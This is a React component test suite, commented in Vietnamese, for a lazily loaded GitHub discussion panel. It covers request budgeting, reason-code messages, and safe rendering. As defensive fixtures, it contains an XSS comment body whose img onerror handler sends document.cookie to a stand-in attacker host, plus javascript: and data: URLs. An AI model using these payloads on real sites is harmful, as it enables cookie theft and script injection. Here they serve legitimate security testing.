import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { LanguageProvider } from '../i18n/LanguageProvider';
import { ErrorBoundary } from '../shell/ErrorBoundary';
import { Discussion } from './Discussion';

const BOUNDARY_FALLBACK = 'Màn hình này gặp lỗi';

/** Mọi lượt gọi `/discussions/*` thật sự rời khỏi trang, theo thứ tự. */
let calls: string[] = [];

const server = setupServer();
beforeAll(() => server.listen({ onUnhandledRequest: 'error' }));
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
beforeEach(() => {
  calls = [];
});

function reply(body: Record<string, unknown>) {
  return http.get('/discussions/:id', ({ params }) => {
    calls.push(String(params.id));
    return HttpResponse.json(body);
  });
}

function thread(over: Record<string, unknown> = {}) {
  return {
    id: 'so-dau-phay-dong',
    loaded: true,
    reason: '',
    url: 'https://github.com/vndee/tuhoc-registry/discussions/7',
    comments: [],
    ...over,
  };
}

function renderDiscussion(id = 'so-dau-phay-dong') {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <LanguageProvider>
        <ErrorBoundary>
          <Discussion registryId={id} />
        </ErrorBoundary>
      </LanguageProvider>
    </QueryClientProvider>,
  );
}

const open = () => userEvent.click(screen.getByRole('button', { name: /thảo luận/i }));
const visible = () => document.body.textContent ?? '';

/* ====================================================================== *
 * 1. TỐN BAO NHIÊU LƯỢT GỌI RA NGOÀI — đếm LỜI GỌI, không đếm hồi đáp
 * ====================================================================== */

describe('ngân sách gọi ra ngoài', () => {
  /**
   * Token GitHub là của MÁY CHỦ, nên hạn ngạch là TOÀN CỤC: báo cáo Task
   * 5-Go đặt `MaxOutboundPerWindow = 30` cho cả nền tảng, mỗi cửa sổ.
   *
   * Một danh mục hai mươi hàng tự động tải thảo luận sẽ tiêu **hai phần ba
   * hạn ngạch của MỌI người** trong một lần mở trang. Nên phần thảo luận chỉ
   * đi hỏi khi người đọc MỞ nó ra.
   *
   * Bài này đếm **request thật sự rời khỏi trang**, không đếm hồi đáp — đúng
   * bài học S2 Task 9 mà tầng Go vừa tái hiện: mutant "gọi mạng rồi mới từ
   * chối" cho hồi đáp y hệt trong khi số lời gọi nhảy 8 → 100.
   */
  it('chưa mở ra thì KHÔNG một lượt gọi nào', async () => {
    server.use(reply(thread()));
    renderDiscussion();

    // Đợi một vòng microtask + macrotask; nếu có request nào được phát, nó
    // đã kịp được ghi lại.
    await waitFor(() => expect(screen.getByRole('button', { name: /thảo luận/i })).toBeEnabled());
    expect(calls).toEqual([]);
  });

  it('mở ra → ĐÚNG một lượt; đóng rồi mở lại KHÔNG gọi thêm', async () => {
    server.use(reply(thread()));
    renderDiscussion();

    await open();
    await waitFor(() => expect(calls).toEqual(['so-dau-phay-dong']));

    await open(); // đóng
    await open(); // mở lại
    await waitFor(() => expect(screen.getByRole('button', { name: /thảo luận/i })).toHaveAttribute('aria-expanded', 'true'));
    expect(calls).toEqual(['so-dau-phay-dong']);
  });
});

/* ====================================================================== *
 * 2. TRẠNG THÁI CỦA HÔM NAY — `reason: "disabled"` trên mọi checkout
 * ====================================================================== */

describe('bốn mã lý do là bốn CÂU KHÁC NHAU', () => {
  it('`disabled` (trạng thái hôm nay) → nói rõ nền tảng chưa nối registry, KHÔNG phải một lỗi', async () => {
    server.use(reply({ id: 'so-dau-phay-dong', loaded: false, reason: 'disabled', url: '', comments: [] }));
    renderDiscussion();
    await open();

    expect(await screen.findByText(/chưa được nối/i)).toBeInTheDocument();
    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
    expect(screen.queryByText(BOUNDARY_FALLBACK)).not.toBeInTheDocument();
    // `url` rỗng khi chưa cấu hình — nên KHÔNG có nút dẫn đi đâu cả.
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });

  it('`unavailable` và `rate_limited` là HAI câu khác nhau, và khác cả `disabled`', async () => {
    const say = async (reason: string) => {
      server.use(reply(thread({ loaded: false, reason })));
      const { unmount } = renderDiscussion();
      await open();
      await screen.findByRole('button', { name: /thảo luận/i });
      await waitFor(() => expect(calls.length).toBeGreaterThan(0));
      const text = visible();
      unmount();
      calls = [];
      return text;
    };

    const [disabled, unavailable, limited] = [await say('disabled'), await say('unavailable'), await say('rate_limited')];
    expect(new Set([disabled, unavailable, limited]).size).toBe(3);
  });

  /**
   * Từ vựng ĐÓNG. Một mã lạ (máy chủ mới hơn, một proxy) không được vẽ
   * NGUYÊN VĂN lên màn hình: nó không dịch được, và chữ do máy chủ viết đi
   * thẳng vào giao diện là đúng cái thói quen mà cổng i18n tồn tại để chặn.
   */
  it('mã lý do LẠ → một câu chung, và bản thân mã KHÔNG xuất hiện', async () => {
    server.use(reply(thread({ loaded: false, reason: 'quota_exceeded_v2' })));
    renderDiscussion();
    await open();

    await waitFor(() => expect(calls.length).toBe(1));
    expect(visible()).not.toContain('quota_exceeded_v2');
    expect(visible()).toMatch(/chưa tải được/i);
  });

  it('`loaded: true` với KHÔNG bình luận nào là câu KHÁC HẲN "chưa tải được"', async () => {
    server.use(reply(thread({ loaded: true, reason: '', comments: [] })));
    renderDiscussion();
    await open();

    expect(await screen.findByText(/chưa có bình luận nào/i)).toBeInTheDocument();
    expect(visible()).not.toMatch(/chưa tải được/i);
  });
});

/* ====================================================================== *
 * 3. RÀNG BUỘC 3 — `body` LÀ MARKDOWN NGUỒN DO NGƯỜI LẠ VIẾT
 * ====================================================================== */

describe('nội dung bình luận', () => {
  const hostile = {
    id: 'C_1',
    author: 'nguoi-la',
    body: '<img src=x onerror="fetch(\'https://kẻ-xấu.vn/?c=\'+document.cookie)"> **đậm**',
    createdAt: '2026-08-22T03:00:00Z',
  };

  /**
   * BÀI CHỊU LỰC của ràng buộc 3, đo ở tầng DOM chứ không ở tầng mã nguồn.
   *
   * `db/local.test.ts` đã canh mã nguồn: không `innerHTML`/`outerHTML`/
   * `insertAdjacentHTML`/`dangerouslySetInnerHTML` mới nào được xuất hiện
   * dưới `apps/web/src` mà không có một mục trong sổ của nó. Bài này canh
   * KẾT QUẢ: dù cài đặt có đi đường nào, một thẻ do người lạ viết phải nằm
   * trên màn hình dưới dạng **chữ**, và không được thành **nút DOM**.
   *
   * Hai chốt vì một chốt không đủ: `querySelector('img')` bắt được thẻ đã
   * thành nút; khẳng định trên `textContent` bắt được trường hợp ngược lại
   * — một bộ lọc quá tay xoá sạch thân bình luận và để lại một khoảng trống,
   * thứ cũng "không có img" nhưng cũng không còn nội dung nào.
   */
  it('markdown nguồn hiện ra dưới dạng CHỮ; không một thẻ nào thành nút DOM', async () => {
    server.use(reply(thread({ loaded: true, comments: [hostile] })));
    renderDiscussion();
    await open();

    await screen.findByText(/đậm/);

    expect(document.querySelector('img')).toBeNull();
    expect(document.querySelector('[onerror]')).toBeNull();
    expect(document.body.innerHTML).not.toContain('<img');
    // Nội dung VẪN CÒN — bộ lọc không được nuốt cả bình luận.
    expect(visible()).toContain('<img src=x');
    expect(visible()).toContain('**đậm**');
  });

  it('`author` rỗng là SENTINEL: chỗ giữ chỗ ĐÃ DỊCH, không phải một khoảng trống', async () => {
    server.use(
      reply(
        thread({
          loaded: true,
          comments: [{ id: 'C_1', author: '', body: 'một câu', createdAt: '2026-08-22T03:00:00Z' }],
        }),
      ),
    );
    renderDiscussion();
    await open();

    expect(await screen.findByText(/tài khoản đã bị xoá/i)).toBeInTheDocument();
  });

  it('nhiều bình luận đều hiện ra, mỗi cái là một mục riêng', async () => {
    server.use(
      reply(
        thread({
          loaded: true,
          comments: [
            { id: 'C_1', author: 'a', body: 'một', createdAt: '2026-08-22T03:00:00Z' },
            { id: 'C_2', author: 'b', body: 'hai', createdAt: '2026-08-22T04:00:00Z' },
          ],
        }),
      ),
    );
    renderDiscussion();
    await open();

    await screen.findByText('một');
    expect(screen.getAllByRole('listitem')).toHaveLength(2);
  });
});

/* ====================================================================== *
 * 4. NÚT ĐĂNG DẪN SANG GITHUB — `href` cũng là một sink
 * ====================================================================== */

describe('nút đăng bình luận', () => {
  it('dẫn sang github.com, mở tab mới, và cắt quan hệ opener', async () => {
    server.use(reply(thread({ loaded: true })));
    renderDiscussion();
    await open();

    const link = await screen.findByRole('link', { name: /github/i });
    expect(link).toHaveAttribute('href', 'https://github.com/vndee/tuhoc-registry/discussions/7');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link.getAttribute('rel') ?? '').toContain('noopener');
    expect(link.getAttribute('rel') ?? '').toContain('noreferrer');
  });

  it.each([
    'javascript:alert(document.cookie)',
    'https://kẻ-xấu.vn/vndee/tuhoc-registry/discussions/7',
    'data:text/html,<script>alert(1)</script>',
  ])('KHÔNG dựng liên kết cho url %s', async (url) => {
    server.use(reply(thread({ loaded: true, url })));
    renderDiscussion();
    await open();

    await waitFor(() => expect(calls.length).toBe(1));
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
    expect(visible()).not.toContain('javascript:');
  });
});

/* ====================================================================== *
 * 5. HỎNG THÌ SUY GIẢM — không bao giờ làm hỏng trang chứa nó
 * ====================================================================== */

describe('hỏng thì suy giảm', () => {
  it.each([
    ['500', () => HttpResponse.json({ error: 'boom' }, { status: 500 })],
    ['thân không phải JSON', () => HttpResponse.html('<!doctype html><h1>404</h1>')],
    ['comments null', () => HttpResponse.json(thread({ comments: null }))],
    ['thân rỗng', () => new HttpResponse(null, { status: 200 })],
    ['mạng chết', () => HttpResponse.error()],
  ])('%s → "chưa tải được thảo luận", KHÔNG phải một trang hỏng', async (_name, make) => {
    server.use(
      http.get('/discussions/:id', ({ params }) => {
        calls.push(String(params.id));
        return make();
      }),
    );
    renderDiscussion();
    await open();

    expect(await screen.findByText(/chưa tải được/i)).toBeInTheDocument();
    expect(screen.queryByText(BOUNDARY_FALLBACK)).not.toBeInTheDocument();
    // Phần còn lại của giao diện vẫn đứng: nút vẫn đó, vẫn đóng/mở được.
    expect(screen.getByRole('button', { name: /thảo luận/i })).toBeEnabled();
  });
});
